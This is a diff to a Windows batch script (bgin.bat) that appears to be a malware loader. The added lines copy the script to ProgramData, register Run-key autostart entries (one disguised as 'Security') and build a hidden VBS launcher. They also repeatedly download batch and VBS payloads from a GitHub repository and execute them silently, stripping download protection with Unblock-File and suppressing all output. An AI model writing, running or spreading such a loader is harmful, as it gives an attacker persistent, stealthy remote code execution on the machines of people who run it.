@@ -1,18 +1,39 @@
 @echo off
+del "C:\ProgramData\word.bat" >> nul
+del "C:\ProgramData\world.vbs" >> nul
+set errorlevel=errorlevel
 ping -n 1 www.google.com >> nul
 if "%errorlevel%" == "0" goto online >> nul
+copy /Y "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" "C:\ProgramData\bgin.bat" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Bgin" /t REG_SZ /F /D "C:\ProgramData\bgin.bat" >> nul
+timeout 0 >> nul
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
+echo Set WinScriptHost = CreateObject("WScript.Shell")>> C:\ProgramData\world.vbs
+echo WinScriptHost.Run Chr(34) & "C:\ProgramData\word.bat" & Chr(34), 0>> C:\ProgramData\world.vbs
+echo Set WinScriptHost = Nothing>> C:\ProgramData\world.vbs
+echo @echo off>> C:\ProgramData\word.bat
+echo ping -n 1 www.google.com>> C:\ProgramData\word.bat
+echo if "%%errorlevel%%" == "0" goto online>> C:\ProgramData\word.bat
+echo goto start>> C:\ProgramData\word.bat
+echo.>> C:\ProgramData\word.bat
+echo :online>> C:\ProgramData\word.bat
+echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\word.bat">> C:\ProgramData\word.bat
+echo timeout 0>> C:\ProgramData\word.bat
+echo start "" "C:\ProgramData\world.vbs">> C:\ProgramData\word.bat
+echo exit>> C:\ProgramData\word.bat
+powershell.exe Unblock-File -Path "*" >> nul
+powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
 exit >> nul
 
 :online >> nul
 mkdir "C:\ProgramData\PSU" >> nul
 timeout 0 >> nul
-curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\PSU\word.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\word.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/world.txt" -O "C:\ProgramData\world.vbs >> nul
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs" >> nul
-start "" /MIN "C:\ProgramData\PSU\word.bat" >> nul
+start "" /MIN "C:\ProgramData\world.vbs" >> nul
 timeout 0 >> nul
 del "C:\ProgramData\bgin.bat" >> nul
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
